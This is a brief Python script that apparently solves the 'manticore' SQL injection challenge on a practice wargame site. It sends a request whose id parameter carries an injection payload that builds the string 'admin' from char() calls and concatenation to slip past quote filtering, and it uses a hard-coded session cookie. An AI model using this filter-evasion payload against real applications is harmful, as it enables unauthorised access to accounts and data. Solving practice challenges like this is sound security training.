import requests

url = "https://los.rubiya.kr/chall/manticore_f88f07d899ad0fc8738fe3aaacff9974.php?"
cookie = {'PHPSESSID':'l76vhg3a57sh6gnch2itdmvsoj'}

def solve():
    query = "id=' or id=char(97)||char(100)||char(109)||char(105)||char(110)-- "
    res = requests.get(url=url+query, cookies=cookie)
    if "MANTICORE Clear!" in res.text:
        print("MANTICORE Clear!")

if __name__ == "__main__":
    solve()